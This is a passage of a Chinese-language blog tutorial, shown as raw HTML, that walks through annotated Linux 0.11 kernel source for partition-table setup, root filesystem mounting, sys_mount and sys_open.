class="class"><span class="keyword">struct</span> <span class="title">partition</span> *<span class="title">p</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">bh</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* setup 只允许被调用一次 */</span></span><br><span class="line"><span class="keyword">if</span> (!callable)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">callable = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* 可以强制在源码中指定硬盘参数, 所以加了宏定义作判断*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HD_TYPE</span></span><br><span class="line"><span class="keyword">for</span> (drive=<span class="number">0</span> ; drive&lt;<span class="number">2</span> ; drive++) &#123;</span><br><span class="line">hd_info[drive].cyl = *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *) BIOS;</span><br><span class="line">hd_info[drive].head = *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) (<span class="number">2</span>+BIOS);</span><br><span class="line">hd_info[drive].wpcom = *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *) (<span class="number">5</span>+BIOS);</span><br><span class="line">hd_info[drive].ctl = *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) (<span class="number">8</span>+BIOS);</span><br><span class="line">hd_info[drive].lzone = *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *) (<span class="number">12</span>+BIOS);</span><br><span class="line">hd_info[drive].sect = *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) (<span class="number">14</span>+BIOS);</span><br><span class="line">BIOS += <span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (hd_info[<span class="number">1</span>].cyl)</span><br><span class="line">NR_HD=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">NR_HD=<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;NR_HD ; i++) &#123;</span><br><span class="line">hd[i*<span class="number">5</span>].start_sect = <span class="number">0</span>;</span><br><span class="line">hd[i*<span class="number">5</span>].nr_sects = hd_info[i].head*</span><br><span class="line">hd_info[i].sect*hd_info[i].cyl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">We querry CMOS about hard disks : it could be that</span></span><br><span class="line"><span class="comment">we have a SCSI/ESDI/etc controller that is BIOS</span></span><br><span class="line"><span class="comment">compatable with ST-506, and thus showing up in our</span></span><br><span class="line"><span class="comment">BIOS table, but not register compatable, and therefore</span></span><br><span class="line"><span class="comment">not present in CMOS.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Furthurmore, we will assume that our ST-506 drives</span></span><br><span class="line"><span class="comment">&lt;if any&gt; are the primary drives in the system, and</span></span><br><span class="line"><span class="comment">the ones reflected as drive 1 or 2.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The first drive is stored in the high nibble of CMOS</span></span><br><span class="line"><span class="comment">byte 0x12, the second in the low nibble.  This will be</span></span><br><span class="line"><span class="comment">either a 4 bit drive type or 0xf indicating use byte 0x19</span></span><br><span class="line"><span class="comment">for an 8 bit type, drive 1, 0x1a for drive 2 in CMOS.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Needless to say, a non-zero value means we have</span></span><br><span class="line"><span class="comment">an AT controller hard disk for that drive.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((cmos_disks = CMOS_READ(<span class="number">0x12</span>)) &amp; <span class="number">0xf0</span>)</span><br><span class="line"><span class="keyword">if</span> (cmos_disks &amp; <span class="number">0x0f</span>)</span><br><span class="line">NR_HD = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">NR_HD = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">NR_HD = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = NR_HD ; i &lt; <span class="number">2</span> ; i++) &#123;</span><br><span class="line">hd[i*<span class="number">5</span>].start_sect = <span class="number">0</span>;</span><br><span class="line">hd[i*<span class="number">5</span>].nr_sects = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">/* 更进一步设置每个盘的参数 */</span></span><br><span class="line"><span class="keyword">for</span> (drive=<span class="number">0</span> ; drive&lt;NR_HD ; drive++) &#123;</span><br><span class="line">        <span class="comment">/* 0x300 和 0x305 分别代表两个硬盘 */</span></span><br><span class="line">        <span class="comment">/* 读取每个硬盘的第一块数据 (1024B) */</span></span><br><span class="line"><span class="keyword">if</span> (!(bh = bread(<span class="number">0x300</span> + drive*<span class="number">5</span>,<span class="number">0</span>))) &#123;</span><br><span class="line">printk(<span class="string">"Unable to read partition table of drive %d\n\r"</span>,</span><br><span class="line">drive);</span><br><span class="line">panic(<span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">/* 判断硬盘有效性 */</span></span><br><span class="line"><span class="keyword">if</span> (bh-&gt;b_data[<span class="number">510</span>] != <span class="number">0x55</span> || (<span class="keyword">unsigned</span> <span class="keyword">char</span>)</span><br><span class="line">    bh-&gt;b_data[<span class="number">511</span>] != <span class="number">0xAA</span>) &#123;</span><br><span class="line">printk(<span class="string">"Bad partition table on drive %d\n\r"</span>,drive);</span><br><span class="line">panic(<span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">/* 读取分区表 (位于 引导扇区第 446 字节开始处 */</span></span><br><span class="line">p = <span class="number">0x1BE</span> + (<span class="keyword">void</span> *)bh-&gt;b_data;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;<span class="number">5</span>;i++,p++) &#123;</span><br><span class="line">hd[i+<span class="number">5</span>*drive].start_sect = p-&gt;start_sect;</span><br><span class="line">hd[i+<span class="number">5</span>*drive].nr_sects = p-&gt;nr_sects;</span><br><span class="line">&#125;</span><br><span class="line">brelse(bh);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (NR_HD)</span><br><span class="line">printk(<span class="string">"Partition table%s ok.\n\r"</span>,(NR_HD&gt;<span class="number">1</span>)?<span class="string">"s"</span>:<span class="string">""</span>);</span><br><span class="line">rd_load();              <span class="comment">/* 尝试创建并加载虚拟盘 */</span></span><br><span class="line">mount_root();           <span class="comment">/* mount 根文件系统 */</span></span><br><span class="line"><span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>终于到了挂载文件系统的时候了</p><p><code>mount_root</code> 用来做初级的初始化工作。同时，上一节已经描述过了，存储设备的超级块是用了记录整个文件系统最重要的结构。</p><p>那么通过将超级块的信息读取到内存，也就可以将内存与外存的文件系统相互联系起来了。</p><p>下面这段代码最重要的内容就是 <code>read_super()</code> 函数了 .</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mount_root</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,<span class="built_in">free</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> * <span class="title">p</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">mi</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="number">32</span> != <span class="keyword">sizeof</span> (struct d_inode))</span><br><span class="line">panic(<span class="string">"bad i-node size"</span>);</span><br><span class="line">    <span class="comment">/* 先初始化文件表，该版本操作系统限制最大同时打开 NR_FILE(64个) 文件 */</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;NR_FILE;i++)</span><br><span class="line">        <span class="comment">/* f_count = 0 表明没有被引用 */</span></span><br><span class="line">file_table[i].f_count=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* 如果引导盘是软盘的话，提示插入根文件系统盘 */</span></span><br><span class="line"><span class="keyword">if</span> (MAJOR(ROOT_DEV) == <span class="number">2</span>) &#123;</span><br><span class="line">printk(<span class="string">"Insert root floppy and press ENTER"</span>);</span><br><span class="line">wait_for_keypress();</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">/* 初始化内存超级块数据结构 (总共 8 个) */</span></span><br><span class="line"><span class="keyword">for</span>(p = &amp;super_block[<span class="number">0</span>] ; p &lt; &amp;super_block[NR_SUPER] ; p++) &#123;</span><br><span class="line">p-&gt;s_dev = <span class="number">0</span>;</span><br><span class="line">p-&gt;s_lock = <span class="number">0</span>;</span><br><span class="line">p-&gt;s_wait = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">/* Hint: 读取超级块的信息，挂载根文件系统重要的部分(代码请往下翻) */</span></span><br><span class="line"><span class="keyword">if</span> (!(p=read_super(ROOT_DEV)))</span><br><span class="line">panic(<span class="string">"Unable to mount root"</span>);</span><br><span class="line">    <span class="comment">/* 读取文件系统的 1 号i节点 (即该设备上文件系统的根节点) */</span></span><br><span class="line"><span class="keyword">if</span> (!(mi=iget(ROOT_DEV,ROOT_INO)))</span><br><span class="line">panic(<span class="string">"Unable to read root i-node"</span>);</span><br><span class="line">mi-&gt;i_count += <span class="number">3</span> ;<span class="comment">/* NOTE! it is logically used 4 times, not 1 */</span></span><br><span class="line">p-&gt;s_isup = p-&gt;s_imount = mi;</span><br><span class="line">    <span class="comment">/* 应该还记得吧，current 指的是当前的任务(任务1)，以后所有的任务都会由任务1或任务1的子任务进行派生，也就意味着 current-&gt;root 会一直复制过去</span></span><br><span class="line"><span class="comment">     * 到这里为止，应该认为根文件系统以及被挂载了。是不是跟被耍了一样?</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">current-&gt;pwd = mi;</span><br><span class="line">current-&gt;root = mi;</span><br><span class="line"><span class="built_in">free</span>=<span class="number">0</span>;</span><br><span class="line">i=p-&gt;s_nzones;</span><br><span class="line">    <span class="comment">/* 统计还有多少空闲数据块以及多少可用i节点 (附上一张启动过程中打印的信息) */</span></span><br><span class="line"><span class="keyword">while</span> (-- i &gt;= <span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> (!set_bit(i&amp;<span class="number">8191</span>,p-&gt;s_zmap[i&gt;&gt;<span class="number">13</span>]-&gt;b_data))</span><br><span class="line"><span class="built_in">free</span>++;</span><br><span class="line">printk(<span class="string">"%d/%d free blocks\n\r"</span>,<span class="built_in">free</span>,p-&gt;s_nzones);</span><br><span class="line"><span class="built_in">free</span>=<span class="number">0</span>;</span><br><span class="line">i=p-&gt;s_ninodes+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (-- i &gt;= <span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> (!set_bit(i&amp;<span class="number">8191</span>,p-&gt;s_imap[i&gt;&gt;<span class="number">13</span>]-&gt;b_data))</span><br><span class="line"><span class="built_in">free</span>++;</span><br><span class="line">printk(<span class="string">"%d/%d free inodes\n\r"</span>,<span class="built_in">free</span>,p-&gt;s_ninodes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fwz8kvvgbpj30l006i3yb.jpg" alt=""></p><p>重要要的部分，<code>read_super(int dev)</code>，用于读取超级块的数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct super_block * <span class="title">read_super</span><span class="params">(<span class="keyword">int</span> dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> * <span class="title">s</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">bh</span>;</span></span><br><span class="line"><span class="keyword">int</span> i,block;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!dev)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">check_disk_change(dev);</span><br><span class="line">    <span class="comment">/* 如果该超级块已经在内存中了，那么就直接使用 (和这里挂载根文件系统的流程无关) */</span></span><br><span class="line"><span class="keyword">if</span> (s = get_super(dev))</span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line">    <span class="comment">/* 设备超级块不在内存中，就先找一个空闲的内存超级块 (总共维护 8 个超级块数据结构) */</span></span><br><span class="line"><span class="keyword">for</span> (s = <span class="number">0</span>+super_block ;; s++) &#123;</span><br><span class="line"><span class="keyword">if</span> (s &gt;= NR_SUPER+super_block)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (!s-&gt;s_dev)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">s-&gt;s_dev = dev;</span><br><span class="line">s-&gt;s_isup = <span class="literal">NULL</span>;</span><br><span class="line">s-&gt;s_imount = <span class="literal">NULL</span>;</span><br><span class="line">s-&gt;s_time = <span class="number">0</span>;</span><br><span class="line">s-&gt;s_rd_only = <span class="number">0</span>;</span><br><span class="line">s-&gt;s_dirt = <span class="number">0</span>;</span><br><span class="line">lock_super(s);</span><br><span class="line">    <span class="comment">/* 通过 block read 读取设备第一个物理块 (每个物理块 1024 B) */</span></span><br><span class="line"><span class="keyword">if</span> (!(bh = bread(dev,<span class="number">1</span>))) &#123;</span><br><span class="line">s-&gt;s_dev=<span class="number">0</span>;</span><br><span class="line">free_super(s);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">/* 复制一份超级块的数据 */</span></span><br><span class="line">*((struct d_super_block *) s) =</span><br><span class="line">*((struct d_super_block *) bh-&gt;b_data);</span><br><span class="line">    <span class="comment">/* 释放缓冲区的数据 */</span></span><br><span class="line">brelse(bh);</span><br><span class="line">    <span class="comment">/* 验证魔数, 该版本操作系统只支持 1.0 版 Minix 文件系统，魔数 0x137F */</span></span><br><span class="line"><span class="keyword">if</span> (s-&gt;s_magic != SUPER_MAGIC) &#123;</span><br><span class="line">s-&gt;s_dev = <span class="number">0</span>;</span><br><span class="line">free_super(s);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">/* 先清空内存中的数据 */</span></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;I_MAP_SLOTS;i++)</span><br><span class="line">s-&gt;s_imap[i] = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;Z_MAP_SLOTS;i++)</span><br><span class="line">s-&gt;s_zmap[i] = <span class="literal">NULL</span>;</span><br><span class="line">block=<span class="number">2</span>;</span><br><span class="line">    <span class="comment">/* 读取 i 节点位图块 */</span></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span> ; i &lt; s-&gt;s_imap_blocks ; i++)</span><br><span class="line"><span class="keyword">if</span> (s-&gt;s_imap[i]=bread(dev,block))</span><br><span class="line">block++;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">/* 读取数据块位图 */</span></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span> ; i &lt; s-&gt;s_zmap_blocks ; i++)</span><br><span class="line"><span class="keyword">if</span> (s-&gt;s_zmap[i]=bread(dev,block))</span><br><span class="line">block++;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (block != <span class="number">2</span>+s-&gt;s_imap_blocks+s-&gt;s_zmap_blocks) &#123;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;I_MAP_SLOTS;i++)</span><br><span class="line">brelse(s-&gt;s_imap[i]);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;Z_MAP_SLOTS;i++)</span><br><span class="line">brelse(s-&gt;s_zmap[i]);</span><br><span class="line">s-&gt;s_dev=<span class="number">0</span>;</span><br><span class="line">free_super(s);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">s-&gt;s_imap[<span class="number">0</span>]-&gt;b_data[<span class="number">0</span>] |= <span class="number">1</span>;</span><br><span class="line">s-&gt;s_zmap[<span class="number">0</span>]-&gt;b_data[<span class="number">0</span>] |= <span class="number">1</span>;</span><br><span class="line">    <span class="comment">/* 与前面的 wait_on_super() 对应(解开lock标志) */</span></span><br><span class="line">free_super(s);</span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是不是觉得也没什么，就这样根文件系统已经挂载了? 毫无实感是吧。</p><h2 id="Extra-普通挂载"><a href="#Extra-普通挂载" class="headerlink" title="Extra: 普通挂载"></a>Extra: 普通挂载</h2><p>既然讲过了根文件系统的挂载。那就顺带着讲讲普通文件系统的挂载吧。</p><p>相信从命令上来讲应该比较简单也比较熟悉吧。<code>mount disk.img /mnt</code> 也算是挂载到 /mnt 下了</p><p>但是，究竟是怎么实现的呢?</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_mount</span><span class="params">(<span class="keyword">char</span> * dev_name, <span class="keyword">char</span> * dir_name, <span class="keyword">int</span> rw_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">dev_i</span>, * <span class="title">dir_i</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> * <span class="title">sb</span>;</span></span><br><span class="line"><span class="keyword">int</span> dev;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** </span></span><br><span class="line"><span class="comment">     * 省略大部分判断逻辑, 主要就是:</span></span><br><span class="line"><span class="comment">     * 1. 判断 dev_name 所属的设备号，读取该设备上的超级块</span></span><br><span class="line"><span class="comment">     * 2. 读取 dir_name (需要挂载到的位置)，判定是否允许被挂载(比如根节点不允许挂其它设备)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 设置超级块的 mount 标志 */</span></span><br><span class="line">sb-&gt;s_imount=dir_i;</span><br><span class="line">    <span class="comment">/* 设置该 i 节点的 mount 标志 */</span></span><br><span class="line">dir_i-&gt;i_mount=<span class="number">1</span>;</span><br><span class="line">dir_i-&gt;i_dirt=<span class="number">1</span>;<span class="comment">/* NOTE! we don't iput(dir_i) */</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;<span class="comment">/* we do that in umount */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><p>前面讲了这么多，终于到了最关心的部分了。当然，也并不是说前面的内容不重要，事实上，相当重要，只是都隐藏在了内核引导的过程中，且调用频度低，才导致了没有存在感。但是这恰恰才是支持文件读写的基石。</p><p>不多说废话，下面就要开始文件读写的内容。</p><h3 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h3><p>打开文件的函数原型是 <code>int open(const char * filename, int flag, ...);</code></p><p>当然，此类系统调用最终的实现都是 <code>int 0x80</code> , 明确一个调用号，然后就陷入内核态了。</p><p>内核态下调用的函数是: <code>int sys_open(const char * filename,int flag,int mode)</code> </p><p>来看看细节:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * filename,<span class="keyword">int</span> flag,<span class="keyword">int</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">inode</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">f</span>;</span></span><br><span class="line"><span class="keyword">int</span> i,fd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * current 是由内核数据段维护的当前任务的指针</span></span><br><span class="line"><span class="comment">     * umask 是指当前任务在新建文件时的默认掩码</span></span><br><span class="line"><span class="comment">     *   例如 Linux 默认是 022, 即新建文件被禁止了组用户与其它用户的写权限</span></span><br><span class="line"><span class="comment">     * 这里是先确定新建文件的权限</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">mode &amp;= <span class="number">0777</span> &amp; ~current-&gt;umask;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 文件描述符，每个文件单独维护一套，以数字标记</span></span><br><span class="line"><span class="comment">     * 找一个空闲的文件描述符项</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">for</span>(fd=<span class="number">0</span> ; fd&lt;NR_OPEN ; fd++)</span><br><span class="line"><span class="keyword">if</span> (!current-&gt;filp[fd])</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (fd&gt;=NR_OPEN)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 顾名思义，设置在调用 exec() 函数时主动关闭的文件</span></span><br><span class="line"><span class="comment">     * exec() 通常与 fork() 联用，fork() 负责复制一个任务，而 exec 负责替换新任务的代码和数据段(从而产生一个新的任务)</span></span><br><span class="line"><span class="comment">     * 这里的声明即是复位 fd 位置的标志，允许子任务也持有相同的文件描述符项</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">current-&gt;close_on_exec &amp;= ~(<span class="number">1</span>&lt;&lt;fd);</span><br><span class="line">f=<span class="number">0</span>+file_table;</span><br><span class="line">    <span class="comment">/* 在文件表中找一项空闲的 */</span></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;NR_FILE ; i++,f++)</span><br><span class="line"><span class="keyword">if</span> (!f-&gt;f_count) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (i&gt;=NR_FILE)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="comment">/* 当前任务的文件描述符项指向文件表项, 同时文件表项的引用计数+1*/</span></span><br><span class="line">(current-&gt;filp[fd]=f)-&gt;f_count++;</span><br><span class="line">    <span class="comment">/* 调用 open_namei 打开文件，如果失败则释放刚才占用的文件结构，并返回错误码 */</span></span><br><span class="line"><span class="keyword">if</span> ((i=open_namei(filename,flag,mode,&amp;inode))&lt;<span class="number">0</span>) &#123;</span><br><span class="line">current-&gt;filp[fd]=<span class="literal">NULL</span>;</span><br><span class="line">f-&gt;f_count=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * 对不同的文件进行不同的特殊处理, 毕竟有 "一切皆文件" 的口号嘛</span></span><br><span class="line"><span class="comment">     * 诸如字符设备等也都是文件</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="comment">/* ttys are somewhat special (ttyxx major==4, tty major==5) */</span></span><br><span class="line"><span class="keyword">if</span> (S_ISCHR(inode-&gt;i_mode))</span><br><span class="line"><span class="keyword">if</span> (MAJOR(inode-&gt;i_zone[<span class="number">0</span>])==<span class="number">4</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (current-&gt;leader &amp;&amp; current-&gt;tty&lt;<span class="number">0</span>) &#123;</span><br><span class="line">current-&gt;tty = MINOR(inode-&gt;i_zone[<span class="number">0</span>]);</span><br><span class="line">tty_table[current-&gt;tty].pgrp = current-&gt;pgrp;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (MAJOR(inode-&gt;i_zone[<span class="number">0</span>])==<span class="number">5</span>)</span><br><span class="line"><span class="keyword">if</span> (current-&gt;tty&lt;<span class="number">0</span>) &#123;</span><br><span class="line">iput(inode);</span><br><span class="line">current-&gt;filp[fd]=<span class="literal">NULL</span>;</span><br><span class="line">f-&gt;f_count=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Likewise with block-devices: check for floppy_change */</span></span><br><span class="line"><span class="keyword">if</span> (S_ISBLK(inode-&gt;i_mode))</span><br><span 